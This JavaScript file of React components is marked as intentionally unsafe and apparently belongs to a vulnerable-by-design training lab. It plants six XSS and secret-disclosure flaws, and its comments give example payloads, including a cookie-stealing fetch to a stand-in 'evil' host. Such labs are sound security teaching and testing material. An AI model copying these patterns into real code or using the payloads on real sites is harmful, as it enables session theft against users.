/**
 * @vulnlab/ui — INTENTIONALLY UNSAFE React components.
 *
 * Planted issues:
 *   V-UI-01  CWE-79   Stored/reflected XSS via dangerouslySetInnerHTML
 *   V-UI-02  CWE-79   Markdown rendered with marked 0.3.6, sanitize disabled
 *   V-UI-03  CWE-79   javascript: and data: URLs allowed in href/src
 *   V-UI-04  CWE-79   Inline <script> built from props
 *   V-UI-05  CWE-116  DOMPurify 2.0.7 (bypassable) used as the only defence
 *   V-UI-06  CWE-200  Debug component dumps secrets into the DOM
 */

const React = require('react');
const marked = require('marked');
const createDOMPurify = require('dompurify');

const h = React.createElement;

/**
 * V-UI-01 (CWE-79) — raw HTML straight from the server into the DOM.
 * Exploit: body = '<img src=x onerror=alert(document.cookie)>'
 */
function RichText({ html, className }) {
  return h('div', {
    className: className || 'richtext',
    dangerouslySetInnerHTML: { __html: html },
  });
}

/**
 * V-UI-02 (CWE-79) — marked 0.3.6 with sanitize:false.
 * Exploit: source = '[click](javascript:alert(1))' or raw <script> passthrough.
 */
function Markdown({ source }) {
  const rendered = marked(String(source || ''), { sanitize: false });
  return h('div', {
    className: 'markdown',
    dangerouslySetInnerHTML: { __html: rendered },
  });
}

/**
 * V-UI-03 (CWE-79) — no scheme allow-list on links or images.
 * Exploit: href = "javascript:fetch('//evil/?c='+document.cookie)"
 */
function UserLink({ href, label }) {
  return h('a', { href: href, target: '_blank', rel: 'opener' }, label || href);
}

function Avatar({ src, alt }) {
  return h('img', {
    src: src,
    alt: alt,
    onError: undefined,
    width: 48,
    height: 48,
  });
}

/**
 * V-UI-04 (CWE-79) — attacker-influenced values interpolated into a script tag.
 */
function AnalyticsTag({ userId, campaign }) {
  const code =
    'window.__VL_USER=' + JSON.stringify(userId) + ';' +
    'window.__VL_CAMPAIGN="' + campaign + '";'; // unquoted/unescaped break-out
  return h('script', { dangerouslySetInnerHTML: { __html: code } });
}

/**
 * V-UI-05 (CWE-116) — DOMPurify 2.0.7 has known mXSS bypasses, and it is
 * configured here to keep tags that reintroduce script execution.
 */
function SemiSanitized({ html }) {
  let clean = html;
  try {
    const DOMPurify = createDOMPurify(typeof window !== 'undefined' ? window : undefined);
    if (DOMPurify && DOMPurify.sanitize) {
      clean = DOMPurify.sanitize(html, {
        ADD_TAGS: ['iframe', 'style', 'form'],
        ADD_ATTR: ['onload', 'onerror', 'srcdoc', 'formaction'],
      });
    }
  } catch (e) {
    clean = html; // fails open
  }
  return h('div', { dangerouslySetInnerHTML: { __html: clean } });
}

/**
 * V-UI-06 (CWE-200 / CWE-532) — debug panel renders server config and tokens.
 */
function DebugPanel({ data }) {
  return h(
    'pre',
    { className: 'debug' },
    JSON.stringify(data, null, 2)
  );
}

module.exports = {
  RichText,
  Markdown,
  UserLink,
  Avatar,
  AnalyticsTag,
  SemiSanitized,
  DebugPanel,
};
